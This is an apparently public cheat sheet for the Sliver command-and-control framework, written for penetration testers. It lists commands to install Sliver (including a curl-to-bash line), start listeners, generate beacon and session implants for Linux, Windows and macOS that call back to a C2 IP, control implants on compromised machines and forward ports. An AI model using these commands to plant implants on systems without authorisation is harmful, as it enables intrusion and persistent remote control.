# Sliver C2 Framework Cheat Sheet

## Overview

This repository contains a comprehensive cheat sheet for the **Sliver C2 Framework**, a powerful open-source Command and Control (C2) platform for penetration testers and red teamers. The goal of this cheat sheet is to provide quick reference commands and usage examples to streamline engagements and enhance operational efficiency.

## Table of Contents
- [Installation](#installation) 
- [Start](#start)
- [Listeners](#listeners) 
	- [View Active Listeners](#view-active-listeners)  
- [Implants](#implants) 
	- [Beacons](#beacons) 
		- [Beacon Implant Generation](#beacon-implant-generation) 
			- [Linux Implant](#linux-implant) 
			- [Windows](#windows) 
			- [MacOS](#macos) 
	- [Sessions](#sessions) 
		- [Session Implant Generation](#session-implant-generation) 
			- [Linux Implant](#linux-implant-1) 
			- [Windows](#windows-1) 
			- [MacOS](#macos-1)  
- [Implant Interaction](#implant-interaction) 
	- [Port Forwarding](#port-forwarding) 
- [Armory](#armory)
## Installation
```bash
curl https://sliver.sh/install | bash
```

Or Clone it Manually:
```bash
git clone https://github.com/BishopFox/sliver.git
cd sliver
go build
```
## Start
```bash
sliver
```
## Listeners
There are several listeners: mtls, http, https
```bash
mtls
```
```bash
http
```
```bash
https
```
### View Active Listeners
```
jobs
```
## Implants
### Beacons
- **Operation**: Beacons operate asynchronously, periodically checking in with the C2 server to retrieve tasks, execute them, and return results. This periodic communication helps minimize detection by reducing constant network activity.
    
- **Use Cases**: Ideal for maintaining a low-profile presence on the target system, suitable for scenarios where minimizing network traffic is crucial.
#### Beacon Implant Generation
##### Linux Implant
```bash
generate beacon --[mtls|http|https] <c2_Listener_IP>:443 --os linux --arch amd64 --format elf --save implant.elf
```
##### Windows
```bash
generate beacon --[mtls|http|https] <c2_Listener_IP>:443 --os windows --arch amd64 --format exe --save implant.exe
```
##### MacOS
```bash
generate beacon --[mtls|http|https] <c2_Listener_IP>:443 --os mac --arch arm64
```
### Sessions
- **Operation**: Sessions provide an interactive, real-time connection between the implant and the C2 server, allowing for immediate command execution and response.
    
- **Use Cases**: Suitable for tasks requiring direct interaction, such as running shell commands, port forwarding, or setting up SOCKS5 proxies.
#### Session Implant Generation
##### Linux Implant
```bash
generate --[mtls|http|https] <c2_Listener_IP>:443 --os linux --arch amd64 --format elf --save implant.elf
```
##### Windows
```bash
generate --[mtls|http|https] <c2_Listener_IP>:443 --os windows --arch amd64 --format exe --save implant.exe
```
##### MacOS
```bash
generate --[mtls|http|https] <c2_Listener_IP>:443 --os mac --arch arm64
```
## Implant Interaction
View all implants
```bash
implants
```
Interact with implants
```
use [implant ID]
```
Help for a list of available commands
```
help
```
Switch to an interactive Session
```
interactive
```
### Port Forwarding
```bash
portfwd --local 8080 --remote 3000
```
In this example:
- **`--local 8080`** → This refers to the local port on your **Kali machine** (where Sliver C2 is running).
- **`--remote 3000`** → This is the port on the **compromised machine (implant's system)** that you want to forward.
## Armory
The **Armory** in Sliver C2 is a package manager introduced in version 1.5 that allows users to install various third-party tools, such as Beacon Object Files (BOFs) and .NET utilities, enhancing the framework's capabilities.
```bash
armory install all
```
